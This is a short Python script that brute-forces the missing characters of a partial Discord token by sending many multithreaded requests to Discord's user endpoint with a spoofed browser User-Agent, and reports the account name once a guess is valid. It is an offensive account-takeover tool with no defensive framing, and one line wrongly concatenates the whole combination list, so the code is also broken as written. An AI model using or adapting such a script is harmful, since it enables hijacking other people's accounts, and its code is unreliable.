import concurrent.futures
import string
import sys
import urllib
from json import loads
from urllib.request import Request

from tqdm import tqdm


# Constants
TOKEN_LENGTH = 59
TOKEN_PATTERN = "/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/"
TOKEN_CHARS = string.ascii_letters + string.digits + "_"


inputToken = ""
if not inputToken:
    inputToken = input("Enter your token: ")
guessLength = TOKEN_LENGTH - len(inputToken)
combos = [i + j for i in TOKEN_CHARS for j in TOKEN_CHARS]
c = len(combos)


def validateToken(token, bot=True):
    if bot:
        token = "Bot " + token
    req = Request(
        "https://discord.com/api/v9/users/@me", 
        headers={
            "Authorization": token,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
        }
    )
    try:
        response = urllib.request.urlopen(req)
        # json to dict
        body = response.read().decode("utf-8")
        data = loads(body)
        if bot:
            token = token[4:]
        data["token"] = token
        if response.code == 200:
            return data
    except Exception as e:
        pass
    return None


if __name__ == '__main__':
    futures = []
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)  # beware cloudflare
    for combo in combos:
        testToken = inputToken + combos
        futures.append(executor.submit(validateToken, testToken))

    with tqdm(total=c) as pbar:
        for future in concurrent.futures.as_completed(futures):
            try:
                data = future.result()
                if data:
                    print(f'Found token: {data["token"]}, {data["username"]}#{data["discriminator"]}')
                    pbar.update(c - pbar.n)
                    pbar.close()
                    sys.exit(0)
            except:
                pass
            pbar.update(1)
